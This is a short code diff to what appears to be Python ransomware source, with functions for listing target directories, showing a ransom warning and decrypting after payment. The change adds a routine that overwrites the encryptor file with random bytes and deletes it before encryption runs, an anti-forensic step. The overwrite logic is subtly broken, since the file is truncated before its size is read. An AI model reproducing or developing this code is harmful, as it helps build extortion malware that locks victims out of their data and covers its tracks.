@@ -12,6 +12,7 @@ from multiprocessing import Process
 from PIL import Image, ImageDraw, ImageFont
 from tkinter import Label, Entry, Button
 import base64, sys
+import pathlib
 
 #0. 기본 환경설정
 AES_BOX=0
@@ -151,8 +152,14 @@ def completeDecryption():
     WINDOW.withdraw()
     messagebox.showerror("User computer is unlocked!", "Thank you for using our service:):):):):) Bye!")
 
-if __name__=='__main__':
+def eraseEncryptor():
     sleep(1)
+    with open(removeTarget, "wb") as File:
+        file_size=os.path.getsize(removeTarget)
+        File.write(os.urandom(file_size+1))
     os.remove(removeTarget)
+
+if __name__=='__main__':
+    eraseEncryptor()
     listUpTargetDir()
     ransomewareWarning()
